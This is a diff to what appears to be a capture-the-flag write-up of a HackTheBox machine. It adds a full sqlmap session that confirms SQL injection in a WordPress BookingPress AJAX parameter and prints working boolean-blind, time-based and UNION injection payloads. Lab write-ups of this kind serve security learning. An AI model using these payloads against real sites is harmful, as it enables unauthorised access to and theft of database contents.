@@ -230,6 +230,92 @@ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpre
 ```
 
 
+```SQL
+┌──(darshan㉿kali)-[~]
+└─$ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service      
+        ___
+       __H__                                                                                                                                           
+ ___ ___[.]_____ ___ ___  {1.7.2#stable}                                                                                                               
+|_ -| . [']     | .'| . |                                                                                                                              
+|___|_  [)]_|_|_|__,|  _|                                                                                                                              
+      |_|V...       |_|   https://sqlmap.org                                                                                                           
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:43:24 /2023-02-13/
+
+[10:43:24] [INFO] testing connection to the target URL
+[10:43:24] [INFO] testing if the target URL content is stable
+[10:43:24] [INFO] target URL content is stable
+[10:43:25] [WARNING] heuristic (basic) test shows that POST parameter 'total_service' might not be injectable
+[10:43:25] [INFO] testing for SQL injection on POST parameter 'total_service'
+[10:43:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:43:26] [INFO] POST parameter 'total_service' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[10:43:27] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+[10:43:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[10:43:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[10:43:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[10:43:34] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[10:43:34] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[10:43:34] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[10:43:34] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[10:43:35] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[10:43:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:43:35] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:43:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[10:43:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[10:43:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[10:43:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[10:43:36] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:43:37] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[10:43:37] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[10:43:37] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[10:43:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[10:43:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[10:43:37] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[10:43:37] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[10:43:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[10:43:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[10:43:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[10:43:37] [INFO] testing 'Generic inline queries'
+[10:43:38] [INFO] testing 'MySQL inline queries'
+[10:43:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[10:43:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[10:43:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[10:43:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[10:43:39] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[10:43:39] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[10:43:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[10:43:50] [INFO] POST parameter 'total_service' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[10:43:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[10:43:50] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[10:43:50] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[10:43:51] [INFO] target URL appears to have 9 columns in query
+[10:43:52] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+---
+Parameter: total_service (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND 1179=1179 AND (5714=5714
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND (SELECT 3708 FROM (SELECT(SLEEP(5)))gLML) AND (2888=2888
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x70536f744a6c56535468795050594841454258666b4a7a7257675a495659666d5a6b595466697348,0x71787a7671),NULL,NULL,NULL,NULL-- -
+---
+[10:43:54] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.18.0, PHP 8.0.24
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[10:43:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'
+
+[*] ending @ 10:43:55 /2023-02-13/
 ```
 
-```
+So now that sqlmap knows that it is vulnerable I, further, enumerated the database.
